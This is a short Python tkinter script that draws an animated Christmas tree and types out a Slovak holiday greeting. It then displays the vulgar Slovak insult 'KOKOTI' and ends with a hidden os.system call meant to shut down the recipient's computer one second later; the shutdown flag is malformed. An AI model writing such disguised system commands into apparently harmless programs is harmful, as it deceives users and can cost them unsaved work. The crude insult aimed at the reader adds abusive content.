import tkinter
import random
import os
import math
c = tkinter.Canvas(width=800, height=600)
c.pack()
x, y = 25, 505
sirka = 350
vyska = 175

def rgb_picker():
    return f"#{random.randrange(255**3):06x}"
c.create_rectangle(175, 575, 225, 500, fill="#7B3F00", outline="") # peň

for i in range(4):  # strom (trojuholniky) + vianocne gule
    c.create_polygon(x, y, x+sirka, y, x+(sirka/2), y-vyska, fill="green", outline="")
    c.create_oval(x+(sirka/10)-15, y-10-15, x+(sirka/10)+15, y-10+15, fill=rgb_picker(), outline="", tags="gule")
    c.create_oval(x+sirka - (sirka/10)-15, y-10-15, x+sirka - (sirka/10)+15, y-10+15, fill=rgb_picker(), outline="", tags="gule")
    sirka -= 50
    x = (400-sirka)/2
    vyska += 5
    y -= vyska/2
for i in range(20):
    x = random.randint(175, 250)
    y = random.randint(100, 475)
    c.create_oval(x-15, y-15, x+15, y+15, fill=rgb_picker(), outline="", tags="gule")
c.create_text(201, 55, text="★", font="arial 50", fill="yellow",)
text = " VESELE VIANOCE A STASTNY NOVY ROK"
x_text = 350
y_text = 50
for i in text:
    if i == " ":
        y_text+= 50
        x_text = 350 
    c.create_text(x_text, y_text, text=i, font="calibri 25")
    c.after(100)
    c.update()
    x_text += 22
x_text += 50
y_text += 50
for i in "KOKOTI":
    c.create_text(x_text, y_text,text=i, font="calibri 70")
    x_text += 50
    c.after(1000)
    c.update()
for i in range(100):
    c.itemconfig("gule", fill=rgb_picker())
    c.after(10)
    c.update()
os.system("shutdown - /t 1")

tkinter.mainloop()